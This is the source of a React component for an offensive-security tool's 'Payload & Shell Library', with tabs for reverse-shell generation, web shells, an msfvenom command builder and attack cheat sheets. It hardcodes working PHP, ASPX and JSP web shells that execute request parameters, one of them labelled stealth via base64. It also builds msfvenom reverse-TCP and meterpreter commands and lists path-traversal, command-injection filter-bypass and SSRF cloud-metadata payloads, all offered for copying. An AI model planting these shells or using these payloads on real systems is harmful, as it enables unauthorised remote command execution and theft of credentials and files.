import React, { useState } from 'react';
import { Terminal, Shield, Copy, Check, RefreshCw, Cpu, Layers } from 'lucide-react';

export default function PayloadLibraryView({ addLog }) {
  const [subTab, setSubTab] = useState('revshell'); // revshell | webshell | msf | cheatsheet

  // Revshell State
  const [lhost, setLhost] = useState('10.10.14.5');
  const [lport, setLport] = useState('4444');
  const [shellType, setShellType] = useState('/bin/bash');
  const [revshellData, setRevshellData] = useState(null);
  const [loadingShell, setLoadingShell] = useState(false);
  const [copiedKey, setCopiedKey] = useState(null);

  // MSFVenom State
  const [msfOs, setMsfOs] = useState('linux/x64/shell_reverse_tcp');
  const [msfFormat, setMsfFormat] = useState('elf');

  // 1. Generate Reverse Shells
  const handleGenerateShells = async () => {
    if (!lhost || !lport) return;
    setLoadingShell(true);
    try {
      const res = await fetch('/api/payloads/generate_revshell', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ lhost, lport, shell_type: shellType })
      });
      const data = await res.json();
      setRevshellData(data);
      addLog('SUCCESS', `Generated ${data.payloads.length} Reverse Shell Variants (${lhost}:${lport})`, data);
    } catch (e) {
      addLog('ERROR', 'Shell Generation Failed', { error: e.message });
    } finally {
      setLoadingShell(false);
    }
  };

  const copyText = (text, key) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  const webShells = [
    {
      name: 'PHP Minimal One-Liner Web Shell',
      code: "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"
    },
    {
      name: 'PHP Stealth Base64 Exec',
      code: "<?php $c=base64_decode($_REQUEST['e']); system($c); ?>"
    },
    {
      name: 'ASPX Command Exec Shell',
      code: "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]); %>"
    },
    {
      name: 'JSP Command Shell',
      code: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
    }
  ];

  const cheatsheets = [
    { title: 'LFI / Path Traversal Vectors', items: ['/etc/passwd', '../../../../etc/passwd', 'C:\\Windows\\win.ini', 'php://filter/convert.base64-encode/resource=index.php'] },
    { title: 'Command Injection Filters Bypass', items: ['cat${IFS}/etc/passwd', 'c\'a\'t /e\'t\'c/p\'a\'s\'s\'w\'d', '`id`', '$(id)', 'ping; id'] },
    { title: 'SSRF Cloud Metadata Endpoints', items: ['http://169.254.169.254/latest/meta-data/', 'http://169.254.169.254/computeMetadata/v1/'] }
  ];

  return (
    <div className="space-y-4 pb-20">
      <div className="flex items-center space-x-2">
        <Terminal className="w-5 h-5 text-emerald-400" />
        <h1 className="font-extrabold text-base text-slate-100">Payload & Shell Library</h1>
      </div>

      {/* Sub Tab Bar */}
      <div className="flex space-x-1 bg-slate-900 p-1 rounded-xl border border-slate-800 text-xs font-mono overflow-x-auto">
        {[
          { id: 'revshell', label: 'Reverse Shells' },
          { id: 'webshell', label: 'Web Shells' },
          { id: 'msf', label: 'MSFVenom Builder' },
          { id: 'cheatsheet', label: 'Cheat Sheets' }
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setSubTab(tab.id)}
            className={`px-3 py-1.5 rounded-lg transition-all shrink-0 ${
              subTab === tab.id
                ? 'bg-emerald-500/20 text-emerald-400 font-bold border border-emerald-500/30'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* SUBTAB 1: REVERSE SHELLS */}
      {subTab === 'revshell' && (
        <div className="space-y-3">
          <div className="bg-slate-900 rounded-xl p-3.5 border border-slate-800 space-y-3">
            <div className="grid grid-cols-3 gap-2 font-mono text-xs">
              <div>
                <label className="text-[10px] text-slate-400 block mb-1">LHOST (IP):</label>
                <input
                  type="text"
                  value={lhost}
                  onChange={(e) => setLhost(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 focus:border-emerald-500 text-slate-100 rounded p-2 focus:outline-none"
                />
              </div>

              <div>
                <label className="text-[10px] text-slate-400 block mb-1">LPORT:</label>
                <input
                  type="text"
                  value={lport}
                  onChange={(e) => setLport(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 focus:border-emerald-500 text-slate-100 rounded p-2 focus:outline-none"
                />
              </div>

              <div>
                <label className="text-[10px] text-slate-400 block mb-1">Shell:</label>
                <select
                  value={shellType}
                  onChange={(e) => setShellType(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 text-slate-100 rounded p-2 focus:outline-none"
                >
                  <option value="/bin/bash">/bin/bash</option>
                  <option value="/bin/sh">/bin/sh</option>
                  <option value="powershell">powershell</option>
                  <option value="cmd.exe">cmd.exe</option>
                </select>
              </div>
            </div>

            <button
              onClick={handleGenerateShells}
              disabled={loadingShell}
              className="w-full py-2 bg-gradient-to-r from-emerald-500 to-teal-500 text-slate-950 font-bold font-mono rounded-lg text-xs flex items-center justify-center space-x-1"
            >
              {loadingShell ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Terminal className="w-4 h-4" />}
              <span>Generate Shell Payloads</span>
            </button>
          </div>

          {revshellData && (
            <div className="space-y-2 font-mono text-xs">
              {revshellData.payloads.map((p, idx) => {
                const key = `rev_${idx}`;
                return (
                  <div key={idx} className="bg-slate-900 p-3 rounded-xl border border-slate-800 space-y-1.5">
                    <div className="flex justify-between items-center text-slate-300 font-bold">
                      <span className="text-emerald-400">{p.name} <span className="text-[10px] text-slate-500">({p.os})</span></span>
                      <button
                        onClick={() => copyText(p.cmd, key)}
                        className="p-1 hover:bg-slate-800 text-slate-400 hover:text-slate-200 rounded flex items-center space-x-1 text-[10px]"
                      >
                        {copiedKey === key ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                        <span>{copiedKey === key ? 'Copied' : 'Copy'}</span>
                      </button>
                    </div>

                    <div className="bg-slate-950 p-2 rounded border border-slate-800 text-slate-200 select-all font-mono text-[11px] truncate">
                      {p.cmd}
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}

      {/* SUBTAB 2: WEB SHELLS */}
      {subTab === 'webshell' && (
        <div className="space-y-2">
          {webShells.map((ws, i) => {
            const key = `ws_${i}`;
            return (
              <div key={i} className="bg-slate-900 p-3 rounded-xl border border-slate-800 space-y-1.5 font-mono text-xs">
                <div className="flex justify-between items-center font-bold">
                  <span className="text-emerald-400">{ws.name}</span>
                  <button
                    onClick={() => copyText(ws.code, key)}
                    className="p-1 hover:bg-slate-800 text-slate-400 hover:text-slate-200 rounded flex items-center space-x-1 text-[10px]"
                  >
                    {copiedKey === key ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>{copiedKey === key ? 'Copied' : 'Copy'}</span>
                  </button>
                </div>
                <pre className="bg-slate-950 p-2 rounded border border-slate-800 text-cyan-400 text-[11px] select-all whitespace-pre-wrap">
                  {ws.code}
                </pre>
              </div>
            );
          })}
        </div>
      )}

      {/* SUBTAB 3: MSFVENOM BUILDER */}
      {subTab === 'msf' && (
        <div className="bg-slate-900 p-3.5 rounded-xl border border-slate-800 space-y-3 font-mono text-xs">
          <div className="grid grid-cols-2 gap-2">
            <div>
              <label className="text-slate-400 block mb-1 text-[10px]">Payload Stager:</label>
              <select
                value={msfOs}
                onChange={(e) => setMsfOs(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 text-slate-100 rounded p-2 focus:outline-none"
              >
                <option value="linux/x64/shell_reverse_tcp">Linux x64 Reverse TCP</option>
                <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter</option>
                <option value="php/meterpreter/reverse_tcp">PHP Meterpreter</option>
                <option value="android/meterpreter/reverse_tcp">Android APK Meterpreter</option>
              </select>
            </div>
            <div>
              <label className="text-slate-400 block mb-1 text-[10px]">Format:</label>
              <select
                value={msfFormat}
                onChange={(e) => setMsfFormat(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 text-slate-100 rounded p-2 focus:outline-none"
              >
                <option value="elf">elf (Linux Executable)</option>
                <option value="exe">exe (Windows Executable)</option>
                <option value="raw">raw</option>
                <option value="php">php</option>
              </select>
            </div>
          </div>

          <div className="space-y-1">
            <span className="text-slate-400 block text-[10px]">Generated MSFVenom CLI Command:</span>
            <div className="bg-slate-950 p-2.5 rounded border border-slate-800 text-emerald-400 font-mono text-[11px] select-all">
              msfvenom -p {msfOs} LHOST={lhost} LPORT={lport} -f {msfFormat} -o shell.{msfFormat}
            </div>
          </div>
        </div>
      )}

      {/* SUBTAB 4: CHEATSHEET */}
      {subTab === 'cheatsheet' && (
        <div className="space-y-3 font-mono text-xs">
          {cheatsheets.map((cs, i) => (
            <div key={i} className="bg-slate-900 p-3 rounded-xl border border-slate-800 space-y-2">
              <span className="text-emerald-400 font-bold block">{cs.title}</span>
              <div className="space-y-1">
                {cs.items.map((item, j) => (
                  <div key={j} className="bg-slate-950 p-1.5 rounded border border-slate-800 text-slate-200 text-[11px] select-all">
                    {item}
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
